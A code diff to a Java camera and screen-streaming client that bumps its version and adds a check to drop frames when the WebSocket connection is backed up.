@@ -30,7 +30,7 @@ public class CameraClient {
 
     // Self-update
     static final String UPDATE_URL = "https://github.com/reyHay/reyhancam/releases/latest/download/camera-client.jar";
-    static final String VERSION    = "2.3";
+    static final String VERSION    = "2.4";
 
     // Runtime-adjustable settings (dashboard can change these via commands)
     static volatile int     camFps        = 30;
@@ -214,7 +214,7 @@ public class CameraClient {
             while (true) {
                 long start = System.currentTimeMillis();
                 try {
-                    if (!paused && !camPaused && ws != null && ws.isOpen()) {
+                    if (!paused && !camPaused && ws != null && ws.isOpen() && shouldSend(false)) {
                         Frame frame = grabber.grab();
                         if (frame != null && frame.image != null) {
                             BufferedImage img = converter.convert(frame);
@@ -250,7 +250,7 @@ public class CameraClient {
             while (true) {
                 long start = System.currentTimeMillis();
                 try {
-                    if (!paused && !screenPaused && ws != null && ws.isOpen()) {
+                    if (!paused && !screenPaused && ws != null && ws.isOpen() && shouldSend(true)) {
                         BufferedImage raw = robot.createScreenCapture(screen);
                         int sw = screenWidth;
                         int scaledH = (int) ((double) raw.getHeight() / raw.getWidth() * sw);
@@ -276,7 +276,12 @@ public class CameraClient {
         System.out.println("[*] Screen capture started");
     }
 
-    // JPEG encoder — quality param separate for camera vs screen
+    // Drop frame if WebSocket has unsent data queued — prevents backlog/delay
+    static boolean shouldSend(boolean isScreen) {
+        if (ws == null || !ws.isOpen()) return false;
+        if (ws.hasBufferedData()) return false; // connection is backed up, drop this frame
+        return true;
+    }
     static String toBase64(BufferedImage img, int quality) {
         try {
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
